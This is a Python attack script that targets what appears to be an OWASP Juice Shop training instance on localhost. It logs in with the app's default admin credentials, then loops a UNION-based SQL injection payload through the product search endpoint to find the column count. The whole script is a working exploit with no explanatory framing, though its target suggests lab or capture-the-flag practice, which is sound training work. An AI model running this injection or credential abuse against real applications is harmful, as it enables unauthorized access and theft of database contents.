import requests
import json

server = 'http://localhost:3000'
session = requests.Session()

# Get Admin Session logic (simplified)
payload = json.dumps({'email': 'admin@juice-sh.op', 'password': 'admin123'})
login = session.post(f'{server}/rest/user/login', headers={'Content-Type': 'application/json'}, data=payload)
if login.ok:
    try:
        token = login.json().get('authentication', {}).get('token') or login.json().get('token')
        session.headers.update({'Authorization': f'Bearer {token}'})
        print("Logged in as Admin.")
    except:
        pass

print("Brute-forcing column count for Products table...")

for i in range(1, 25):
    nulls = ','.join(['NULL'] * i)
    payload = f"')) UNION SELECT {nulls}-- "
    
    # url = f"{server}/rest/product/search?q={payload}"
    # resp = session.get(url)
    resp = session.get(f"{server}/rest/product/search", params={'q': payload})
    
    if resp.status_code == 200:
        print(f"[SUCCESS] Found correct column count: {i}")
        print(f"Response sample: {resp.text[:100]}")
        break
    else:
        # print(f"[FAIL] Column count {i}: Status {resp.status_code}") 
        # Only print first fail content to see error message
        if i == 1:
             print(f"[FAIL] Check content: {resp.text[:200]}")

